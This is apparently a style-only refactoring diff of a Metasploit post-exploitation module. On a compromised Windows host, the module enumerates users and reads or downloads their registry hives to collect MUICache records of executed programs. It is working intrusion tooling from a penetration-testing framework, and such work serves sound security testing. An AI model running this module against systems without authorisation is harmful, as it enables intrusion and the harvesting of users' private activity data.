@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -12,24 +13,23 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'        =>'Windows Gather Enum User MUICache',
-      'Description' =>
-      %q{
-        This module gathers information about the files and file paths that logged on users have
-        executed on the system. It also will check if the file still exists on the system. This
-        information is gathered by using information stored under the MUICache registry key. If
-        the user is logged in when the module is executed it will collect the MUICache entries
-        by accessing the registry directly. If the user is not logged in the module will download
-        users registry hive NTUSER.DAT/UsrClass.dat from the system and the MUICache contents are
-        parsed from the downloaded hive.
-      },
-      'License'     =>  MSF_LICENSE,
-      'Author'      =>  ['TJ Glad <tjglad[at]cmail.nu>'],
-      'Platform'    =>  ['win'],
-      'SessionType' =>  ['meterpreter']
-    ))
+                      'Name' => 'Windows Gather Enum User MUICache',
+                      'Description' =>
+                      %q(
+                        This module gathers information about the files and file paths that logged on users have
+                        executed on the system. It also will check if the file still exists on the system. This
+                        information is gathered by using information stored under the MUICache registry key. If
+                        the user is logged in when the module is executed it will collect the MUICache entries
+                        by accessing the registry directly. If the user is not logged in the module will download
+                        users registry hive NTUSER.DAT/UsrClass.dat from the system and the MUICache contents are
+                        parsed from the downloaded hive.
+                      ),
+                      'License'     =>  MSF_LICENSE,
+                      'Author'      =>  ['TJ Glad <tjglad[at]cmail.nu>'],
+                      'Platform'    =>  ['win'],
+                      'SessionType' =>  ['meterpreter']))
   end
 
   # Scrapes usernames, sids and homepaths from the registry so that we'll know
@@ -48,9 +48,7 @@ class MetasploitModule < Msf::Post
     end
 
     profile_subkeys.each do |user_sid|
-      unless user_sid.length > 10
-        next
-      end
+      next unless user_sid.length > 10
       user_home_path = registry_getvaldata("#{username_reg_path}\\#{user_sid}", "ProfileImagePath")
       if user_home_path.blank?
         print_error("Unable to read ProfileImagePath from the registry. Unable to continue.")
@@ -62,7 +60,7 @@ class MetasploitModule < Msf::Post
       user_sids << user_sid
     end
 
-    return user_names, user_homedir_paths, user_sids
+    [user_names, user_homedir_paths, user_sids]
   end
 
   # This function builds full registry muicache paths so that we can
@@ -88,7 +86,6 @@ class MetasploitModule < Msf::Post
     all_user_entries = sys_users.zip(muicache_reg_keys, sys_paths)
 
     all_user_entries.each do |user, reg_key, sys_path|
-
       subkeys = registry_enumvals(reg_key)
       if subkeys.blank?
         # If the registry_enumvals returns us nothing then we'll know
@@ -96,10 +93,8 @@ class MetasploitModule < Msf::Post
         # download and process users hive locally.
         print_warning("User #{user}: Can't access registry. Maybe the user is not logged in? Trying NTUSER.DAT/USRCLASS.DAT...")
         result = process_hive(sys_path, user, muicache, hive_file)
-        unless result.nil?
-          result.each { |r|
-            results << r unless r.nil?
-          }
+        result&.each do |r|
+          results << r unless r.nil?
         end
       else
         # If the registry_enumvals returns us content we'll know that we
@@ -153,11 +148,19 @@ class MetasploitModule < Msf::Post
       session.fs.file.download_file(local_hive_copy.path, hive_path)
     rescue ::Rex::Post::Meterpreter::RequestError
       print_error("Unable to download NTUSER.DAT/USRCLASS.DAT file")
-      local_hive_copy.unlink rescue nil
+      begin
+        local_hive_copy.unlink
+      rescue
+        nil
+      end
       return nil
     end
     results = hive_parser(local_hive_copy.path, muicache, user)
-    local_hive_copy.unlink rescue nil # Windows often complains about unlinking tempfiles
+    begin
+      local_hive_copy.unlink
+    rescue
+      nil
+    end # Windows often complains about unlinking tempfiles
 
     results
   end
@@ -213,11 +216,11 @@ class MetasploitModule < Msf::Post
     print_status("Starting to enumerate MUICache registry keys...")
     sys_info = sysinfo['OS']
 
-    if sys_info =~/Windows XP/ && is_admin?
+    if sys_info =~ /Windows XP/ && is_admin?
       print_good("Remote system supported: #{sys_info}")
       muicache = "\\Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache"
       hive_file = "\\NTUSER.DAT"
-    elsif sys_info =~/Windows 7/ && is_admin?
+    elsif sys_info =~ /Windows 7/ && is_admin?
       print_good("Remote system supported: #{sys_info}")
       muicache = "_Classes\\Local\ Settings\\Software\\Microsoft\\Windows\\Shell\\MUICache"
       hive_file = "\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat"
@@ -233,8 +236,9 @@ class MetasploitModule < Msf::Post
       [
         "Username",
         "File path",
-        "File status",
-      ])
+        "File status"
+      ]
+    )
 
     print_status("Phase 1: Searching user names...")
     sys_users, sys_paths, sys_sids = find_user_names
@@ -243,7 +247,7 @@ class MetasploitModule < Msf::Post
       print_error("Was not able to find any user accounts. Unable to continue.")
       return nil
     else
-      print_good("Users found: #{sys_users.join(", ")}")
+      print_good("Users found: #{sys_users.join(', ')}")
     end
 
     print_status("Phase 2: Searching registry hives...")
@@ -258,5 +262,4 @@ class MetasploitModule < Msf::Post
     print_status("Results stored as: #{loot}")
     print_status("Execution finished.")
   end
-
 end
